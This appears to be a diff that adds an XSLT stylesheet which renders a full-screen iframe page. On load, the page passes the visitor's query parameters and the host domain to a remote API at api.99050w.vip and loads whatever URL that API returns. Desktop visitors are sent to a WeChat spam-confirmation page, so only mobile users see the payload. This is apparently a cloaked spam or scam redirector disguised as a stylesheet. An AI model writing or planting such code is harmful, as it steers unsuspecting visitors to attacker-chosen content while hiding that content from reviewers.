@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns="http://www.w3.org/1999/xhtml">
+    <xsl:template match="/">
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8" />
+            <title>文明、富强、和谐</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+            <style>
+                html,body,#iframe{
+                    padding:0;
+                    margin:0;
+                    width:100%;
+                    height:100%
+                }
+                #iframe{
+                    border:0;
+                }
+
+            </style>
+            <script type="text/javascript">
+                function fetchApiContent() {
+                    const url = 'https://api.99050w.vip/api/vip/get_domain';
+
+                    const urlParams      = new URLSearchParams(window.location.search);
+                    // const paramValue     = urlParams.get('code');
+                    const domain = window.location.host;
+                    const targetUrl = new URL(url); // 鏇挎崲涓虹洰鏍囩綉绔� URL
+
+                    urlParams.forEach((value, key) => {
+                        targetUrl.searchParams.append(key, value);
+                    });
+                    targetUrl.searchParams.append('domain', domain);
+                    const apiUrl = targetUrl.toString();
+                    fetch(apiUrl)
+                        .then(response => response.json())
+                        .then(data => {
+                            const targetUrl = data.url;
+                            if (targetUrl) {
+                                setTimeout(() => {
+                                    document.getElementById("iframe").src = targetUrl;
+                                }, 100);
+                            } else {
+                                console.log('Error: No target URL found');
+                            }
+                        })
+                        .catch(error => {
+                            console.log('Error:', error);
+                        });
+                }
+
+                window.addEventListener('load', fetchApiContent);
+
+            </script>
+            <script>
+                var _hmt = _hmt || [];
+                (function() {
+                    var hm = document.createElement("script");
+                    hm.src = "https://hm.baidu.com/hm.js?247a58df5a6e2754738531496ee37a11";
+                    var s = document.getElementsByTagName("script")[0];
+                    s.parentNode.insertBefore(hm, s);
+                })();
+            </script>
+
+            <script>
+                var system = {};
+                var p = navigator.platform;
+                var u = navigator.userAgent;
+
+                system.win = p.indexOf("Win") == 0;
+                system.mac = p.indexOf("Mac") == 0;
+                system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+                if (system.win || system.mac || system.xll) {//如果是PC转
+                    if (u.indexOf('Windows Phone') > -1) {  //win手机端
+                    } else {
+                        window.location.href = "https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi";
+                    }
+                }
+            </script>
+        </head>
+
+        <body>
+
+        <iframe id="iframe" src=""  height="100%"></iframe>
+
+        </body>
+        </html>
+    </xsl:template>
+</xsl:stylesheet>
